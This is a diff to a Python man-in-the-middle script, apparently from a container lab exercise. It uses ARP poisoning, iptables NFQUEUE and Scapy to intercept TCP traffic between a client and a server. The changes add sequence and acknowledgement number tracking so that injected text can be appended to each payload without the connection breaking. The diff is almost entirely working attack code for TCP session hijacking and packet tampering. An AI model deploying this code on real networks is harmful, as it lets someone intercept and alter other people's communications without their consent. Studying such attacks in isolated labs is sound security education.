@@ -7,9 +7,15 @@ import time
 from netfilterqueue import NetfilterQueue
 from copy import deepcopy
 
+# It does not work if we are barging in without shutting the connection down
 # Don't forget to forward packets to the queue
 # iptables -I FORWARD -j NFQUEUE --queue-num 1
 # When done: iptables -D FORWARD -j NFQUEUE --queue-num 1
+
+# Container start bash
+# client - sudo docker exec -it b2bbb29431cb bash
+# middle - sudo docker exec -it b35b664de112 bash
+# server - sudo docker exec -it 343ca79c2992 bash
 
 #ARP Poison parameters
 gateway_ip = "198.7.0.1"
@@ -61,58 +67,98 @@ fake_server_th.start()
 
 captured_packets = []
 
+# Needed for breaking the connection
 first_conn = True
+
+# Keeping track of the sequence and acknoledgement number (both the correct and tampered ones) 
+good_seq1 = None
+good_seq2 = None
+
+bad_seq1 = None
+bad_seq2 = None
+
+# Flags for special cases
+first_message = False
+first_response = False
+
 def process_packet_seq_spoof(pkt):
-    global first_conn
+    global first_conn, good_seq1, good_seq2, bad_seq1, bad_seq2, first_message, first_response
     scapy_pkt = IP(pkt.get_payload())
     print(f"Src: {scapy_pkt[IP].src}, Dst: {scapy_pkt[IP].dst}")
 
-    if scapy_pkt.haslayer(Raw) and scapy_pkt.haslayer(TCP):
-        # Barge right in their conversation and reset it
-        if first_conn:
-            print("Barging right in")
-            first_conn = False
+    if scapy_pkt.haslayer(TCP):
+        # Set seq numbers of the client and server
+        if scapy_pkt[TCP].flags.A and not scapy_pkt[TCP].flags.S and not good_seq1:
+                good_seq1 = scapy_pkt[TCP].seq
+                good_seq2 = scapy_pkt[TCP].ack
+                first_message = True
 
-            # Send reset to destination        
-            send(IP(src=scapy_pkt[IP].src, dst=scapy_pkt[IP].dst)/
-                 TCP(sport=scapy_pkt[TCP].sport, dport=scapy_pkt[TCP].dport, flags="R",
-                    seq=scapy_pkt[TCP].seq, ack=scapy_pkt[TCP].ack))
-            
-            # Send reset to source
-            send(IP(src=scapy_pkt[IP].dst, dst=scapy_pkt[IP].src)/
-                 TCP(sport=scapy_pkt[TCP].dport, dport=scapy_pkt[TCP].sport, flags="R",
-                    seq=scapy_pkt[TCP].ack, ack=scapy_pkt[TCP].seq + len(scapy_pkt[Raw].load)))
-            
-            # Drop the old packet(they will never know!!!)
-            pkt.drop()
-        else: # We are in, just hack the message now
+        # Print relevant information
+        print(f"Good seq1: {good_seq1}\nGood seq2: {good_seq2}\nBad seq1: {bad_seq1}\nBad seq2: {bad_seq2}")
+        print(f"SEQ: {scapy_pkt[TCP].seq}\nACK: {scapy_pkt[TCP].ack}")
+        print(f"Flags: {scapy_pkt[TCP].flags}")
+
+        # Set the new packet to the old one
+        new_packet = scapy_pkt
+        if scapy_pkt.haslayer(Raw):
             og_msg = scapy_pkt[Raw].load
             print(f"Original payload: {og_msg}")
 
             # Add my super original message
             my_msg = b"(HACKED)"
             new_msg = og_msg + my_msg
-            
-            # Change the sequence number(they will never know)
-            scapy_pkt[TCP].seq -= len(my_msg)
-            scapy_pkt[Raw].load = new_msg
-            scapy_pkt[TCP].flags.P = True
 
-            # Re-do checksums(thanks scappy)
-            del scapy_pkt[IP].len
-            del scapy_pkt[IP].chksum
-            del scapy_pkt[TCP].chksum
+            # Keep track of the packet's seq and ack nr
+            pkt_seq = scapy_pkt[TCP].seq
+            pkt_ack = scapy_pkt[TCP].ack
+
+            # Case1: Move the seq nr to the next one and set bad_seq
+            if first_message:   
+                good_seq1 += len(og_msg)
+                bad_seq1 = good_seq1 + len(my_msg)
+                first_message = False
+                first_response = True
+            # Case2: Move the seq nr to the next one, set bad_seq and set the ack nr to the one the receiver expects
+            elif first_response:
+                good_seq2 += len(og_msg)
+                bad_seq2 = good_seq2 + len(my_msg)
+                first_response = False
+                pkt_ack = good_seq1
+            # Case3(symetric for client and server): 
+            # Move the seq nr and bad_seq to the next one, set the packet seq and ack to the ones the receiver expects
+            elif pkt_seq == good_seq1: # First guy sends message
+                good_seq1 += len(og_msg)
+                
+                pkt_seq = bad_seq1
+                pkt_ack = good_seq2
+
+                bad_seq1 += len(new_msg)
+            elif pkt_seq == good_seq2: # Second guy sends message
+                good_seq2 += len(og_msg)
+                
+                pkt_seq = bad_seq2
+                pkt_ack = good_seq1
+
+                bad_seq2 += len(new_msg)
 
             # Send the new message
-            pkt.set_payload(bytes(scapy_pkt))
-            pkt.accept()
-
+            new_packet = (IP(src=scapy_pkt[IP].src, dst=scapy_pkt[IP].dst)/
+                         TCP(sport=scapy_pkt[TCP].sport, dport=scapy_pkt[TCP].dport,
+                             seq=pkt_seq, ack=pkt_ack,
+                             flags=scapy_pkt[TCP].flags,
+                             options=scapy_pkt[TCP].options
+                             )/
+                         Raw(load=new_msg))
             print("Hacking complete ;)")
+        else:
+            print(f"TCP PACKET WITH NO DATA: {scapy_pkt[TCP].flags}")
+            
+        send(new_packet)
+        pkt.drop()
     else:
         print(f"WEIRD PACKET: {pkt}!")
         pkt.accept()
-
-
+        
 queue = NetfilterQueue()
 queue.bind(1, process_packet_seq_spoof)
 try:
